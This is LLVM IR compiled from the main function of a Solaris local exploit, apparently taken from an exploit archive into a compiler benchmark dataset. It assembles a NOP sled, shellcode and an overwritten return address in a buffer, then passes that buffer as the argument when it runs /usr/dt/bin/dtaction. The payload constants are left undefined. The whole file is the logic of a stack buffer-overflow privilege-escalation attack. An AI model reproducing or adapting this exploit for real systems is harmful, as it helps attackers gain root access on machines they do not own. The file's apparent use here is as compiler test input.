; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20603.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20603.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@EIP_OFFSET = common dso_local global i32 0, align 4
@shell_code = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"esp=%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"0:Default value 1:Calculated value >\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@FAKE_OFFSET = common dso_local global i32 0, align 4
@FAKE_VALUE = common dso_local global i32 0, align 4
@EIP_VALUE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"Jumping address = %x\0A\00", align 1
@FAKE_VALUE_DIF = common dso_local global i32 0, align 4
@EIP_VALUE_DIF = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c"/usr/dt/bin/dtaction\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @BUF_SIZE, align 4
  %7 = zext i32 %6 to i64
  %8 = call i8* @llvm.stacksave()
  store i8* %8, i8** %2, align 8
  %9 = alloca i8, i64 %7, align 16
  store i64 %7, i64* %3, align 8
  %10 = call i32 (...) @get_sp()
  store i32 %10, i32* %4, align 4
  %11 = load i32, i32* @NOP, align 4
  %12 = load i32, i32* @BUF_SIZE, align 4
  %13 = call i32 @memset(i8* %9, i32 %11, i32 %12)
  %14 = load i32, i32* @EIP_OFFSET, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %9, i64 %15
  %17 = load i32, i32* @shell_code, align 4
  %18 = call i32 @strlen(i32 %17)
  %19 = sext i32 %18 to i64
  %20 = sub i64 0, %19
  %21 = getelementptr inbounds i8, i8* %16, i64 %20
  %22 = load i32, i32* @shell_code, align 4
  %23 = load i32, i32* @shell_code, align 4
  %24 = call i32 @strlen(i32 %23)
  %25 = call i32 @memcpy(i8* %21, i32 %22, i32 %24)
  %26 = load i32, i32* %4, align 4
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i32 %26)
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %29 = load i32, i32* @stdout, align 4
  %30 = call i32 @fflush(i32 %29)
  %31 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32* %5)
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %34, label %47

34:                                               ; preds = %0
  %35 = load i32, i32* @FAKE_OFFSET, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %9, i64 %36
  %38 = load i32, i32* @FAKE_VALUE, align 4
  %39 = call i32 @valset(i8* %37, i32 %38)
  %40 = load i32, i32* @EIP_OFFSET, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %9, i64 %41
  %43 = load i32, i32* @EIP_VALUE, align 4
  %44 = call i32 @valset(i8* %42, i32 %43)
  %45 = load i32, i32* @EIP_VALUE, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i32 %45)
  br label %66

47:                                               ; preds = %0
  %48 = load i32, i32* @FAKE_OFFSET, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %9, i64 %49
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* @FAKE_VALUE_DIF, align 4
  %53 = sub i32 %51, %52
  %54 = call i32 @valset(i8* %50, i32 %53)
  %55 = load i32, i32* @EIP_OFFSET, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %9, i64 %56
  %58 = load i32, i32* %4, align 4
  %59 = load i32, i32* @EIP_VALUE_DIF, align 4
  %60 = add i32 %58, %59
  %61 = call i32 @valset(i8* %57, i32 %60)
  %62 = load i32, i32* %4, align 4
  %63 = load i32, i32* @EIP_VALUE_DIF, align 4
  %64 = add i32 %62, %63
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i32 %64)
  br label %66

66:                                               ; preds = %47, %34
  %67 = load i32, i32* @BUF_SIZE, align 4
  %68 = sub nsw i32 %67, 1
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %9, i64 %69
  store i8 0, i8* %70, align 1
  %71 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %9, i32* null)
  %72 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %72)
  %73 = load i32, i32* %1, align 4
  ret i32 %73
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @scanf(i8*, i32*) #2

declare dso_local i32 @valset(i8*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
